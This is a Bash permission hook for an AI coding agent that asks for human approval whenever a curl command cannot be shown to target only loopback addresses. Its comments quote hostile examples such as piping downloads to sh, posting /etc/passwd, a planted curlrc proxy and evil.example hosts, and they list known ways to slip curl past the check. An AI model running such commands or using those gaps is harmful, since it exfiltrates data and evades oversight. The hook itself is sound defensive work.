#!/usr/bin/env bash
# PreToolUse hook: curl の宛先がループバックだけだと示せないときに ask を返す。
#
# `Bash(curl:*)` は permissions.ask に置かない。Claude Code 2.1.285 では ask ルールに一致した
# 呼び出しにフックの allow が効かず、ループバック宛だけ緩める向きが作れないため
# (ADR 0008 / 0009)。代わりにこのフックが、ワンショットのダウンロードや `curl … | sh` に
# 人間の承認を挟む。日常の `curl http://localhost:3000/api` は無出力で classifier に任せる。
#
# `permissions` はこの区別を表現できない: ルールはプレフィックス照合で、URL はフラグの後ろ
# (`curl -sS -H … URL`)に来るので `Bash(curl http://localhost:*)` では届かない。
# そこで git-push-guard.sh と同じくコマンド文字列全体を読む。
#
# Decision contract (docs: PreToolUse hookSpecificOutput):
#   ask         — curl を実行しうる token があり、宛先がループバックだけだと示せないとき
#                 (読み切れない綴り・curlrc・未知の flag やパイプ先・ループバック以外の宛先)、
#                 または reader が 1 token に飲み込んだ curl が字面の床に一致したとき
#   (no output) — curl を実行しうる token が無く字面の床にも一致しないか、すべての segment が
#                 ループバック宛だけの curl か INERT_COMMANDS(`echo curl`・`grep -rn curl …` も含む)。
#                 classifier が判定する
#   このフックは allow を返さない。
#
# フックが死ぬ(未配置・クラッシュ)と curl は classifier の判定だけになる(git-push-guard と同じ向き)。
# 8192 byte を超えるコマンドは安く読めないので、行単位の字面の床だけを当てる(ADR 0009)。
# 残存(ADR 0009): `bash -c "curl …"` の内側、`cu""rl …` や `/usr/bin/cur?`(下の `*curl*` の
# 早期終了が reader の引用符除去と展開より先に走る)、`c=curl; $c …`(curl と読める token が無い)。
#
# 認識は全階層(flag・パイプ先・URL スキーム・ホスト)が許可リスト。未知の token は
# 「たぶん安全」ではなく ask にする。
#
# 残存(受容): 縛るのは宛先アドレスだけで、最終到達先(ループバックのリスナーによる中継)と
# 副作用(`-o` / `--dump-header` / `>`)は縛らない。新たな到達性が増えない理由は .claude/rules/curl-localhost-guard.md。
#
# 引用符の外の `?` / `[` も `*` と同じく語の数を変えるので拒否する。ただし token 自身がループバック URL で、
# authority に glob が無いものは通す(glob_token_is_loopback_safe。理由は .claude/rules/curl-localhost-guard.md)。
# glob は宛先チェックそのものを破るので、上の残存とは違って受容しない。
# classify_segment とその呼び先は shell_reader_each_segment が名前で間接的に呼ぶ。
# 新しい shellcheck は SC2329、CI の ubuntu に入っている古い版は同じ指摘を SC2317 で出すので両方を抑制する。
# shellcheck disable=SC2317,SC2329
set -euo pipefail

# 起動の自前の部分。起動 module(lib/command-guard.bash)が無い・壊れているときも ask を返すため、各 guard が持つ。
# 手順と理由は module のヘッダ。動詞を含まない入力は module を読まずに終わる。
COMMAND_GUARD_STDIN_FAILED=0
COMMAND_GUARD_STDIN=$(cat) || COMMAND_GUARD_STDIN_FAILED=1
# 動詞は自前の部分の照合と command_guard_start の --verb で共有する(ずれると動詞を含む入力が module に届かない)。
COMMAND_GUARD_VERB='*curl*'
# shellcheck disable=SC2053 # 動詞は glob として照合する
[[ $COMMAND_GUARD_STDIN_FAILED -eq 1 || "$COMMAND_GUARD_STDIN" == $COMMAND_GUARD_VERB ]] || exit 0
command_guard_dir=${BASH_SOURCE[0]%/*}
[[ "$command_guard_dir" != "${BASH_SOURCE[0]}" ]] || command_guard_dir=.
# shellcheck source-path=SCRIPTDIR source=lib/command-guard.bash
if [[ ! -r "$command_guard_dir/lib/command-guard.bash" ]] || ! "$BASH" -n "$command_guard_dir/lib/command-guard.bash" ||
    ! source "$command_guard_dir/lib/command-guard.bash" || ! declare -F command_guard_start command_guard_emit >/dev/null; then
    printf '%s\n' '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":"curl-localhost-guard: フックの部品を読めないため承認が必要です(起動 module を読めない)"}}'
    exit 0
fi

# 引用符を解釈して token に分ける reader は他のフックと共有している。読めなかった理由は flag で返るだけで、
# 扱いは segment の走査(classify_segment)の前の判定で決める。
command_guard_start --name curl-localhost-guard --verb "$COMMAND_GUARD_VERB" --on-unreadable ask \
    --lib shell-reader.bash \
    --require 'shell_reader_read shell_reader_each_segment shell_reader_text_floor_matches'
# command_guard_start から戻った時点で、COMMAND(.tool_input.command。動詞に一致する)と jq が使える。

ASK_REASON='curl-localhost-guard: 宛先がループバック(localhost / 127.0.0.0/8 / [::1])だけだと確認できないため、承認が必要です。'

# curl は引数を見る前に curlrc を読み、`proxy = …` の 1 行でループバック URL が任意のホストへ
# 振り替わる。`--resolve` / `--connect-to` / `-x` を綴りで落としても、コマンド文字列に痕跡を
# 残さないファイル 1 つで無効になるため、存在自体を「読み切れない」として扱う。
# ここでは記録だけして、判定は curl を実行しうる token があるか確かめた後(末尾)で行う。
# curl は次のうち最初に存在するものを読む。XDG_CONFIG_HOME が無いときは `$CURL_HOME/.config/curlrc` と
# `$HOME/.config/curlrc` も読む(curl 8.7.1 で実測)。順序は問わず、どれか 1 つでもあれば扱いは同じ。
# このリポジトリは curlrc を管理していない。
# (環境変数の `http_proxy` も同じクラスだが、フックの環境は Bash ツールの環境と別なので検査不能。)
CURLRC_PRESENT=0
for rc in "${CURL_HOME:-}/.curlrc" "${XDG_CONFIG_HOME:-}/curlrc" "${HOME:-}/.curlrc" \
    "${CURL_HOME:-}/.config/curlrc" "${HOME:-}/.config/curlrc"; do
    case "$rc" in /.curlrc | /curlrc | /.config/curlrc) continue ;; esac
    if [[ -e "$rc" || -L "$rc" ]]; then
        CURLRC_PRESENT=1
        break
    fi
done

# --- host classification -----------------------------------------------------

# True when the bare host (no scheme, no port, no path) is loopback.
is_loopback_host() {
    case "$1" in
    localhost | ::1 | '[::1]') return 0 ;;
    # 127.0.0.0/8. The octet shape is checked so `127.0.0.1.evil.com` — a real
    # registrable name that merely starts with the digits — is not loopback.
    127.*)
        local rest=${1#127.}
        [[ "$rest" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]] && return 0
        return 1
        ;;
    esac
    return 1
}

# True when a URL-ish token addresses loopback and nothing else.
is_loopback_url() {
    local url=$1 authority host

    # Brace and bracket globbing turns one token into many URLs, and only the
    # `[::1]` authority form is worth reading through.
    case "$url" in
    *'{'* | *'}'*) return 1 ;;
    esac

    # Scheme: absent (curl assumes http) or http/https. Anything else — file://,
    # dict://, gopher://, scp://, telnet:// — is a different capability.
    case "$url" in
    http://*) url=${url#http://} ;;
    https://*) url=${url#https://} ;;
    *://*) return 1 ;;
    esac

    # Authority runs up to the first path, query or fragment delimiter.
    authority=${url%%/*}
    authority=${authority%%\?*}
    authority=${authority%%#*}
    [[ -z "$authority" ]] && return 1

    # Userinfo is the trap: in `http://localhost@evil.com/` the host is
    # evil.com. Rather than parse it, refuse the form outright.
    case "$authority" in
    *@*) return 1 ;;
    esac

    # Port. The bracketed IPv6 form keeps its brackets so is_loopback_host can
    # match `[::1]` exactly.
    case "$authority" in
    \[*\]) host=$authority ;;
    \[*\]:*) host=${authority%%\]:*}] ;;
    *:*) host=${authority%%:*} ;;
    *) host=$authority ;;
    esac

    is_loopback_host "$host"
}

# True when a token carrying an unquoted `?` or `[` can still be read. The one
# safe shape is a loopback URL whose authority is entirely literal: pathname
# expansion can only replace the glob, so every word it can produce still begins
# with the same `http://localhost:3000/` and still addresses loopback. A glob
# anywhere in the authority is refused — `http://localhost?x` reads as host
# `localhost` here while the shell can expand it to `localhostsomething` — and a
# token that is not a URL at all (`[ab]evil.example` as a `-H` value) is refused
# outright, because the extra words it produces become curl's next arguments.
glob_token_is_loopback_safe() {
    # `--url=…` is the one flag whose value is itself the URL, so the prefix is
    # stripped rather than making that spelling a prompt.
    local token=${1#--url=} authority

    is_loopback_url "$token" || return 1

    case "$token" in
    http://*) authority=${token#http://} ;;
    https://*) authority=${token#https://} ;;
    *) authority=$token ;;
    esac
    # Up to the first `/` only — `?` and `#` are NOT cut here, because a `?` in
    # that position is the glob this function exists to refuse, not a query
    # delimiter the shell knows about.
    authority=${authority%%/*}
    # `[::1]` is the only bracketed authority is_loopback_host accepts, and its
    # bracket expression can match nothing but `:` or `1`.
    authority=${authority#'[::1]'}
    case "$authority" in
    *'?'* | *'['* | *']'* | *'*'*) return 1 ;;
    esac
    return 0
}

# --- curl segment classification ---------------------------------------------

# Flags that take no value. Short flags may be bundled (`-fsSL`), so the bundle
# is checked letter by letter against SAFE_SHORT_FLAGS.
# `--location` and `--location-trusted` are deliberately absent: a 3xx from the
# loopback listener sends curl itself to wherever the redirect points, so they
# break the one thing this hook checks. `--location-trusted` forwards the
# credentials too. `--disable` is absent as well — it suppresses the curlrc,
# but the hook already bails when a curlrc exists, and listing it here would
# read as if spelling it were the defence.
SAFE_LONG_FLAGS='--silent --show-error --verbose --include --head --insecure --fail --fail-with-body --fail-early --globoff --compressed --no-buffer --ipv4 --ipv6 --progress-bar --no-progress-meter --http1.1 --http2 --path-as-is --raw --tcp-nodelay --no-keepalive --remote-name --create-dirs --get'
SAFE_SHORT_FLAGS='sSvIikfgN46O#'

# Flags whose value is the next token and is not a URL.
SAFE_VALUE_LONG_FLAGS='--request --header --data --data-raw --data-binary --data-urlencode --json --output --write-out --max-time --connect-timeout --retry --retry-delay --retry-max-time --user-agent --referer --cookie --cookie-jar --range --max-filesize --dump-header --form-string --oauth2-bearer --user --aws-sigv4 --http-version'
SAFE_VALUE_SHORT_FLAGS='XHdomwAebcr'

in_list() {
    local needle=$1 list=$2 item
    for item in $list; do
        [[ "$item" == "$needle" ]] && return 0
    done
    return 1
}

# $1 = flag(`-d` / `--data` の形), $2 = その値。値がローカルのファイルか標準入力を本文などに
# 読み込む形なら 0。`@file` はファイルを、`-` は標準入力を読む。ただし `-o` / `--output` の `-` は
# 標準出力への書き出しなので読み込みではない。`--data-urlencode` は `name@file` の形でもファイルを読む。
value_reads_local_input() {
    case "$2" in
    @*) return 0 ;;
    -)
        [[ "$1" == -o || "$1" == --output ]] && return 1
        return 0
        ;;
    esac
    [[ "$1" == --data-urlencode && "$2" == *@* ]] && return 0
    return 1
}

# Every token of a bundled short flag must be a known no-value short flag; a
# bundle whose LAST letter takes a value (`-sSo out.json`) is also accepted.
# 途中の文字が値を取る flag なら、残りがその値になる(curl と同じ読み。`-XPOST`、`-sSHAccept: x`)。
# Returns 0 = no value consumed, 1 = value token consumed, 2 = unrecognized.
classify_short_bundle() {
    local bundle=${1#-} index letter last
    [[ -z "$bundle" ]] && return 2
    last=${bundle: -1}
    for ((index = 0; index < ${#bundle} - 1; index++)); do
        letter=${bundle:index:1}
        [[ "$SAFE_SHORT_FLAGS" == *"$letter"* ]] && continue
        if [[ "$SAFE_VALUE_SHORT_FLAGS" == *"$letter"* ]]; then
            value_reads_local_input "-$letter" "${bundle:index+1}" && return 2
            return 0
        fi
        return 2
    done
    if [[ "$SAFE_SHORT_FLAGS" == *"$last"* ]]; then
        return 0
    elif [[ "$SAFE_VALUE_SHORT_FLAGS" == *"$last"* ]]; then
        return 1
    fi
    return 2
}

# $@ = the tokens of one segment, starting at the `curl` binary.
# Returns 0 when every target is loopback and every flag is recognized.
classify_curl() {
    local tokens=("$@")
    local count=${#tokens[@]}
    local index=1 token value urls=0 rc

    while [[ $index -lt $count ]]; do
        token=${tokens[$index]}

        # Input redirection feeds a local file into the request body, which is
        # the same capability `-d @file` is refused for below. Refusing it here
        # keeps that rule from being a formality `-d - < /etc/passwd` walks past.
        # Matched on the operator SHAPE (optional file descriptor, then `<`)
        # rather than on `<` anywhere in the token: the reader (lib/shell-reader.bash) has already
        # split every real redirection into its own token, so a `<` left inside
        # a token can only have come from quotes, and refusing those made
        # `curl --data='<ping/>' http://localhost/` prompt for nothing.
        if [[ "$token" =~ ^[0-9]*\< ]]; then
            return 1
        fi

        # Output redirections are not curl's arguments. The reader (lib/shell-reader.bash) kept any
        # file-descriptor digit attached to the operator, so a bare operator
        # consumes the filename that follows and an operator with the filename
        # already glued on consumes only itself.
        # 読み飛ばすのは reader が演算子として読んだ token だけ(SHELL_READER_OPERATOR_INDEXES)。
        # 引用された `">"` や `\>` は curl の引数で、字面で判定すると次の引数(2 つ目の URL)まで
        # 読み飛ばしてしまう(`curl http://localhost/ ">" https://evil.example/` が無出力になっていた)。
        # classify_segment は segment の先頭から渡すので、segment 内の index に SEGMENT_START を足す。
        case "$SHELL_READER_OPERATOR_INDEXES" in
        *" $((SHELL_READER_SEGMENT_START + index)) "*)
            if [[ "$token" =~ ^[0-9]*\>[\>|]?$ ]]; then
                index=$((index + 2))
                continue
            elif [[ "$token" =~ ^[0-9]*\>[\>|]?. ]]; then
                index=$((index + 1))
                continue
            fi
            ;;
        esac

        case "$token" in
        --url)
            value=${tokens[$((index + 1))]:-}
            [[ -z "$value" ]] && return 1
            is_loopback_url "$value" || return 1
            urls=$((urls + 1))
            index=$((index + 2))
            ;;
        --url=*)
            is_loopback_url "${token#--url=}" || return 1
            urls=$((urls + 1))
            index=$((index + 1))
            ;;
        --*=*)
            in_list "${token%%=*}" "$SAFE_VALUE_LONG_FLAGS" || return 1
            # `-d @file` / `--data=@file` reads a local file into the body.
            value_reads_local_input "${token%%=*}" "${token#*=}" && return 1
            index=$((index + 1))
            ;;
        --*)
            if in_list "$token" "$SAFE_LONG_FLAGS"; then
                index=$((index + 1))
            elif in_list "$token" "$SAFE_VALUE_LONG_FLAGS"; then
                value=${tokens[$((index + 1))]:-}
                [[ -z "$value" ]] && return 1
                value_reads_local_input "$token" "$value" && return 1
                index=$((index + 2))
            else
                # --proxy, --resolve, --connect-to, --next, --config,
                # --unix-socket, --upload-file, --form … each of which can put
                # the request somewhere other than the URL says.
                return 1
            fi
            ;;
        -)
            return 1
            ;;
        -*)
            set +e
            classify_short_bundle "$token"
            rc=$?
            set -e
            case $rc in
            0) index=$((index + 1)) ;;
            1)
                value=${tokens[$((index + 1))]:-}
                [[ -z "$value" ]] && return 1
                value_reads_local_input "-${token: -1}" "$value" && return 1
                index=$((index + 2))
                ;;
            *) return 1 ;;
            esac
            ;;
        *)
            is_loopback_url "$token" || return 1
            urls=$((urls + 1))
            index=$((index + 1))
            ;;
        esac
    done

    # URL が無い curl(`curl --version`、素の `curl`)は、宛先がループバックだと示せないので ask にする。
    [[ $urls -gt 0 ]]
}

# Commands allowed to sit beside curl in a pipeline or a compound command.
# Read-only text filters only: the point is to keep `curl … | sh` out while
# `curl … | jq .` stays frictionless.
# `sort` は入れない: `--compress-program=PROG` は PROG を起動して一時データを stdin で渡すので、
# `curl … | sort --compress-program=sh` が `| sh` と同じになる(macOS の /usr/bin/sort で実測)。
INERT_COMMANDS='jq head tail cat wc grep egrep fgrep uniq tr cut column echo printf true rev cd sleep'

# --- segment walk ------------------------------------------------------------

# 1 segment を分類する。コマンド全体をプロンプトに残すべきときは非 0。
# reader が segment ごとに呼ぶ(引数が segment の token)。
classify_segment() {
    # 語頭の `=` は zsh の EQUALS(`=curl` は PATH 上の curl)。外して同じ判定に掛ける。
    local segment=("$@") binary=${1#=} index

    # 改行を含む token は、bash が実行する行を飲み込んでいることがある(なぜ飲み込むかは lib の
    # shell_reader_text_floor_matches)。飲み込まれた行は字面の床の「行頭の curl」に一致しなければ何も見ないので
    # (`find … -exec curl …`)、UNCLOSED_QUOTE と同じく読み切れないとして ask にする。ただし curl の引数
    # (`-d '{"a":⏎"b"}'` の複数行の本文)は classify_curl が値として読むので除き、`#` で始まる token だけは
    # curl の segment でも数える。
    # 受容した誤 ask: ループバック宛の curl と、curl 以外のコマンドの改行を含む引用符付きの引数(複数行の
    # コミットメッセージ)の組み合わせ。
    for ((index = 0; index < ${#segment[@]}; index++)); do
        case "${segment[$index]}" in
        *$'\n'*)
            [[ "$binary" != "curl" || "${segment[$index]}" == \#* ]] && return 1
            ;;
        esac
    done

    # No prefix skipping. `VAR=value curl …` can set http_proxy, and `env` /
    # `sudo` can do the same, so an unrecognized leading word is a prompt rather
    # than something to look past.
    # The bare name only. git-push-guard accepts `/usr/bin/git` because there a
    # wider match is the conservative direction; here it is the widening one,
    # and `./tools/curl` would otherwise let any script the agent just wrote
    # claim to be curl.
    if [[ "$binary" == "curl" ]]; then
        # Glob marks only matter here: an inert segment's arguments are never
        # read as destinations, so `jq .[0]` needs no prompt.
        for ((index = 1; index < ${#segment[@]}; index++)); do
            case "$SHELL_READER_GLOB_INDEXES" in
            *" $((SHELL_READER_SEGMENT_START + index)) "*)
                glob_token_is_loopback_safe "${segment[$index]}" || return 1
                ;;
            esac
        done
        classify_curl "${segment[@]}" || return 1
        return 0
    fi

    in_list "$binary" "$INERT_COMMANDS" || return 1
    return 0
}

# --- 字面の床 ----------------------------------------------------------------
#
# reader は引用符の中の `$(…)` やバッククォートの中を読まないので、`x="$(curl …)"` の curl は
# 1 token の文字列に埋まる。閉じていない引用符(heredoc 本文の `don't`)も、それ以降を 1 token に
# 飲み込む(bash は heredoc の後ろの `curl … | sh` を実行するのに)。どちらも curl を実行しうる
# token が無いように見えるので、行ごとに「curl がコマンドの位置にあるか」を字面で見て ask にする。
# コマンドの位置 = 行頭か `; & | ( `` ` `` の直後(空白と、`/usr/bin/` のようなパスの前置は許す)。
# POSIX ERE で書く。`\b` は macOS の /bin/bash 3.2 の `=~` では単語境界にならない。
# 受容した誤 ask: heredoc や置換の中の散文で、行頭か `;&|(` の直後に `curl ` を置いたもの
# (Markdown のコードスパン `` `curl …` `` も含む。PR 本文でよく出る)。
# 末尾は空白か行末。引用符の外のバッククォート置換(x=`curl -s https://…`)は reader が空白で
# 割るので、token が `x=`curl` で終わる(先頭のバッククォートしか外さない CURL_PRESENT にも掛からない)。
# コマンドの位置と curl の間には、前置きの語(変数の代入か、`command` / `env` / `timeout` などの
# コマンド前置詞)と、それに続く任意の語を許す(`timeout 5 curl`、`env -i curl`、`http_proxy=… curl`)。
# curl の直前の `\` も許す(`\curl` は alias を避けるだけで curl を実行する)。引用符の外では
# 同じ綴りを segment の走査が読むので、この床が要るのは引用符の中の置換だけ。前置詞の後ろに `curl`
# を語として含む散文の行(`env を見てから curl する`)が ask になるのは受容した誤 ask。
# シェルのキーワード(`then curl …`、`do curl …`、`{ curl …; }`)もコマンドの位置を作る。heredoc に
# 飲み込まれた行が `if …; then curl … | sh; fi` でも一致するように含める。`case` の `a) curl …` の `)` は
# 含めない — `"$(date) curl is fine"` の散文まで ask になる(受容した残存)。
# `eval` も前置詞に含める(`"$(eval curl …)"` の curl は eval の引数として実行される)。
# 前置詞はパス付きでもよい(`"$(/usr/bin/env curl …)"`)。
# コマンドの前の redirect(`"$(2>/dev/null curl …)"`、`"$(<in curl …)"`)もコマンドの位置を動かさない。
# redirect は対象の語 1 つだけを読み飛ばす(前置詞のように任意の語を許すと散文まで一致する)。
# fd の数字の無い `<` / `>` は対象が続けて書かれた形だけを読む: 空白を挟む形を許すと Markdown の引用
# `> 今回は curl を…` が「今回は への redirect + curl」に一致する。`"$(< in curl …)"` は受容した残存。
CURL_PREFIX_WORD_RE='([A-Za-z_][A-Za-z0-9_]*=[^[:space:]]*|([^[:space:]]*/)?(command|builtin|eval|env|exec|sudo|doas|nice|nohup|time|timeout|xargs|stdbuf|ionice|caffeinate)|if|then|elif|else|while|until|do|[!]|[{])'
CURL_REDIRECT_WORD_RE='([0-9]+[<>][<>&|]*[[:space:]]*|[<>][<>&|]*)[^[:space:]]+'
CURL_LINE_RE="(^|[;&|(\`])[[:space:]]*(${CURL_REDIRECT_WORD_RE}[[:space:]]+)*(${CURL_PREFIX_WORD_RE}[[:space:]]+([^[:space:]]+[[:space:]]+)*)?\\\\?([^[:space:]]*/)?curl([[:space:]]|\$)"
# 行の分割と、引用符・backslash・行継続の正規化は lib の shell_reader_text_floor_matches が行う
# (`"$(curl'' https://…)"` も `curl https://…` として見る)。

# 長すぎる入力では reader が token を作らない(安く読めない)。curl を実行しうる token も見つからないので、
# 字面の床(shell_reader_text_floor_matches)が生のコマンド全体を見て、一致しなければ何も返さず classifier に任せる(ADR 0009)。
shell_reader_read "$COMMAND"

# 印の付いた token $1 が、展開の結果として basename が `curl` の語になりうるか。ブレース展開の
# token(`curl,https://…`)は `,` で区切った要素ごとに、パス名展開の token はそのものをパターンとして
# 照合する(どちらも区切ると広がる方向にしか動かない)。
marked_token_can_be_curl() {
    local rest=$1 element
    while :; do
        element=${rest%%,*}
        # 右辺は引用しない: 展開の結果を推し量るためにパターンとして照合する。
        # shellcheck disable=SC2053
        [[ curl == ${element##*/} ]] && return 0
        [[ "$rest" == *,* ]] || return 1
        rest=${rest#*,}
    done
}

# curl を実行しうる token があるか。引用符の中の文字列は reader が 1 token にまとめるので、
# `echo "curl …"` の `curl …` はここで一致しない。バッククォートで始まる token は実行されるので外して見る。
# 語頭の `=` も外す: Bash ツールが zsh で動く環境では `=curl` が PATH 上の curl に展開される(EQUALS)。
# ブレース展開とパス名展開は、展開の結果としてだけ curl を作れる(bash の `{curl,https://…}`、
# zsh でも効く `env {curl,https://…}`、`/usr/bin/curl*`)。そういう印の付いた token が、展開の結果として
# basename が `curl` の語になりうれば実行しうるとみなし、下の WORD_MULTIPLIER か segment の走査で ask に
# する。`test/curl-*.bats` のように curl を含んでも curl にはなりえない glob は巻き込まない。
# 受容した誤 ask: `ls docs/*curl*` のように、basename が curl になりうる glob を引数に書いたもの。
CURL_PRESENT=0
for index in "${!SHELL_READER_TOKENS[@]}"; do
    token=${SHELL_READER_TOKENS[$index]}
    token=${token#\`}
    token=${token#=}
    if [[ "${token##*/}" == "curl" ]]; then
        CURL_PRESENT=1
        break
    fi
    case "$token" in
    *curl*)
        case "$SHELL_READER_BRACE_INDEXES$SHELL_READER_GLOB_INDEXES" in
        *" $index "*)
            if marked_token_can_be_curl "$token"; then
                CURL_PRESENT=1
                break
            fi
            ;;
        esac
        ;;
    esac
done

# reader が読み切れない部分(引用符の中の置換に埋まった curl、heredoc やコメントに飲み込まれた行、閉じていない
# 引用符、長さ超過のコマンド全体。対象は lib の shell_reader_text_floor_matches)で、curl がコマンドの位置に
# あれば ask にする。
# 受容した誤 ask: 置換より後ろの引用符付きの引数が `curl ` で始まるもの(`-m "$(date)" -m "curl …"`)。
if shell_reader_text_floor_matches "$CURL_LINE_RE"; then
    command_guard_emit ask "$ASK_REASON"
    exit 0
fi
if [[ $CURL_PRESENT -eq 0 ]]; then
    exit 0
fi

# 変数・置換は宛先を運べる(代入の前置は `http_proxy` で URL を外へ振り替えられる)、
# 番兵は偽の segment 境界を作れる、{ } * は単語数を変える。読み切れないコマンドとして ask。
# 詳細は lib/shell-reader.bash。
# 引用符が閉じないまま終わったときも ask にする。閉じていない token は curl の segment に入るとは
# 限らない: `curl http://localhost/ && echo it's ; curl https://evil… | sh` では `'` 以降が `echo` の
# 引数の 1 token になり、`echo` は INERT_COMMANDS なので segment の走査を通る。字面の床は閉じていない
# 最後の token に curl がコマンドの位置で現れたときしか一致しないので、それだけでは塞がらない
# (`echo it's ; find . -exec curl …`)。受容した誤 ask: ループバック宛の curl と、アポストロフィを含む
# heredoc 本文の組み合わせ(後ろに何も無くても ask)。PR 本文の heredoc は curl が 1 token に
# 飲み込まれて CURL_PRESENT=0 側に行くので、この条件には来ない。
# curlrc の存在は上で実行前に見たが、同じコマンドの前の segment が作ることもできる
# (`printf 'proxy = …' > ~/.curlrc; curl http://localhost/`。printf は INERT_COMMANDS)。
# そこで curlrc を名指す token があれば、存在するのと同じに扱う。
# 改行を含む token は classify_segment が同じく読み切れないとして扱う。
for token in "${SHELL_READER_TOKENS[@]}"; do
    case "$token" in *curlrc*)
        CURLRC_PRESENT=1
        break
        ;;
    esac
done
if [[ $CURLRC_PRESENT -eq 1 || $SHELL_READER_EXPANSION -eq 1 ||
    $SHELL_READER_SEP_IN_INPUT -eq 1 || $SHELL_READER_WORD_MULTIPLIER -eq 1 ||
    $SHELL_READER_UNCLOSED_QUOTE -eq 1 || $SHELL_READER_PROCESS_SUBSTITUTION -eq 1 ]]; then
    command_guard_emit ask "$ASK_REASON"
    exit 0
fi

# すべての segment がループバック宛の curl か INERT_COMMANDS なら無出力(classifier が判定する)。
# curl がコマンドの位置に無くても、すべての segment が INERT_COMMANDS なら curl は実行されない
# (`grep -rn curl dot_claude/`、`echo curl`)ので無出力にする。`xargs curl` や `find … -exec curl` は
# xargs / find が INERT_COMMANDS に無いので、classify_segment が 1 を返して ask になる。
if ! shell_reader_each_segment classify_segment; then
    command_guard_emit ask "$ASK_REASON"
fi
exit 0
